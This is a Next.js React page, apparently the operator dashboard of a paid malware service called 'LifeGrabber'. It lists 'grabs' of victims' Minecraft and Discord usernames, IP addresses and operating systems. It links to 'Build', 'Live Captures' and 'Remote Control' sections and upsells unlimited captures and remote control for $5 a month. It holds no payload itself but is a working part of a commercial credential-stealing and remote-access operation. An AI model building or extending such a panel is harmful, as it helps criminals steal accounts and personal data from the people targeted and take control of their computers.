'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  border: 'rgba(255,255,255,0.06)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
  blue: '#3b82f6',
  red: '#ef4444',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} className="btn-smooth" style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function GrabsPage() {
  const router = useRouter();
  const [grabs, setGrabs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [isPro, setIsPro] = useState(false);
  const [freeUses, setFreeUses] = useState(null);
  const [trialExhausted, setTrialExhausted] = useState(false);
  const [proChecked, setProChecked] = useState(false);
  const [, setTick] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => setTick(t => t + 1), 10000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          const normEmail = d.user.email.toLowerCase().trim();
          setUserEmail(normEmail);
          if (normEmail === 'lifegrading@gmail.com') {
            setIsPro(true);
            setProChecked(true);
            return fetch('/api/grabs');
          } else {
            return fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' })
              .then(r => r.json())
              .then(p => {
                setIsPro(p.is_pro);
                setFreeUses(p.free_uses_remaining);
                setTrialExhausted(p.trial_exhausted || false);
                setProChecked(true);
                const url = `/api/grabs?owner_email=${encodeURIComponent(normEmail)}`;
                return fetch(url);
              })
              .catch(() => { setIsPro(false); setProChecked(true); return null; });
          }
        }
        setLoading(false);
        return null;
      })
      .then(r => r ? r.json() : null)
      .then(d => { if (d) setGrabs(d.grabs || []); setLoading(false); })
      .catch(() => setLoading(false));
  }, []);

  const formatTime = (created, updated) => {
    const ref = updated || created;
    if (!ref) return '';
    const d = new Date(ref);
    const now = new Date();
    const diff = Math.floor((now - d) / 1000);
    if (diff < 5) return 'Just now';
    if (diff < 60) return `${diff}s ago`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
    return d.toLocaleDateString();
  };

  const filtered = grabs.filter(g => {
    const q = search.toLowerCase();
    return (
      g.minecraft_username?.toLowerCase().includes(q) ||
      g.discord_username?.toLowerCase().includes(q) ||
      g.ip_address?.toLowerCase().includes(q)
    );
  });

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  const isOwner = userEmail === 'lifegrading@gmail.com';
  const canAccess = isPro || isOwner || (freeUses !== null && freeUses > 0);

  if (!canAccess && !isOwner) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
            <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
            <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
          </div>
          <div style={{ flex: 1 }}>
            <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
            <NavItem icon="⚡" label="Grabs" active onClick={() => {}} />
            <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
            <NavItem icon="📋" label="Plans" onClick={() => router.push('/dashboard')} />
            <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard')} />
            <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
            <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
          </div>
          <div>
            <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
            <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
          </div>
        </aside>
        <div style={{ flex: 1, padding: '40px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
          <div className="glass-card" style={{ maxWidth: 440, width: '100%', padding: '36px', borderRadius: 16, textAlign: 'center', border: '1px solid ' + colors.border }}>
            <div style={{ fontSize: 48, marginBottom: 16 }}>🔒</div>
            <h2 style={{ fontSize: 20, fontWeight: 700, margin: '0 0 8px 0', color: colors.text }}>Free Trial Exhausted</h2>
            <p style={{ fontSize: 13, color: colors.textDim, margin: '0 0 24px 0', lineHeight: 1.5 }}>
              You have used all your free trial captures. Upgrade to Pro for unlimited captures and full remote control access.
            </p>
            <button
              onClick={() => router.push('/dashboard')}
              style={{
                width: '100%', padding: '12px 0', background: colors.green, color: '#000',
                border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer'
              }}
            >
              Upgrade to Pro ($5/mo)
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" active onClick={() => {}} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          {isOwner && (
            <NavItem icon="👥" label="Admin" onClick={() => router.push('/admin')} />
          )}
          <NavItem icon="📋" label="Plans" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
          <span style={{ fontSize: 24, fontWeight: 700 }}>Grabs</span>
          <span style={{ color: colors.textDim, fontSize: 14 }}>{grabs.length} captured</span>
          {isOwner ? (
            <span style={{ color: colors.green, fontSize: 12, background: 'rgba(34, 197, 94, 0.1)', padding: '3px 10px', borderRadius: 6, fontWeight: 600 }}>
              ⚡ OWNER
            </span>
          ) : isPro ? (
            <span style={{ color: colors.green, fontSize: 12, background: 'rgba(34, 197, 94, 0.1)', padding: '3px 10px', borderRadius: 6, fontWeight: 600 }}>
              👑 PRO (Unlimited)
            </span>
          ) : (
            <span style={{ color: colors.blue, fontSize: 12, background: 'rgba(59, 130, 246, 0.1)', padding: '3px 10px', borderRadius: 6, fontWeight: 600 }}>
              Free Trial: {freeUses !== null && freeUses !== undefined ? freeUses : 3} uses remaining
            </span>
          )}
        </div>
        <div style={{ marginBottom: 20, display: 'flex', justifyContent: 'flex-end' }}>
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search..."
            className="glass-card"
            style={{ borderRadius: 8, padding: '8px 14px', color: colors.text, fontSize: 13, outline: 'none', width: 220, border: '1px solid rgba(255,255,255,0.06)', transition: 'all 0.2s ease' }}
          />
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          {filtered.map((g) => {
            const isUpdated = g.updated_at && g.updated_at !== g.created_at;
            return (
              <div
                key={g.id}
                onClick={() => router.push(`/dashboard/grabs/${g.id}`)}
                className="glass-card"
                style={{ borderRadius: 12, padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer' }}
              >
                <div style={{ width: 42, height: 42, borderRadius: 10, background: 'rgba(255,255,255,0.03)', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
                  <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/42`} alt="" style={{ width: 42, height: 42 }} onError={e => { e.target.style.display = 'none'; }} />
                </div>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</span>
                    {isUpdated && (
                      <span style={{ background: 'rgba(245, 158, 11, 0.15)', color: '#f59e0b', fontSize: 9, padding: '2px 6px', borderRadius: 4, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 0.5 }}>*Updated</span>
                    )}
                    <span style={{ background: 'rgba(94, 234, 212, 0.1)', color: '#5eead4', fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 600, whiteSpace: 'nowrap' }}>
                      {g.os?.includes('Windows') ? 'Windows' : g.os?.includes('Mac') ? 'macOS' : g.os?.includes('Linux') ? 'Linux' : g.os || 'Unknown'}
                    </span>
                  </div>
                  <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{g.discord_username}</div>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 14, flexShrink: 0 }}>
                  <span style={{ fontSize: 12, color: colors.textDim }}>{formatTime(g.created_at, g.updated_at)}</span>
                  <span style={{ fontSize: 16, color: colors.textDim }}>→</span>
                </div>
              </div>
            );
          })}
          {filtered.length === 0 && !loading && (
            <div className="glass-card" style={{ padding: '60px', textAlign: 'center', color: colors.textDim, borderRadius: 12, fontSize: 13 }}>
              No grabs found
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
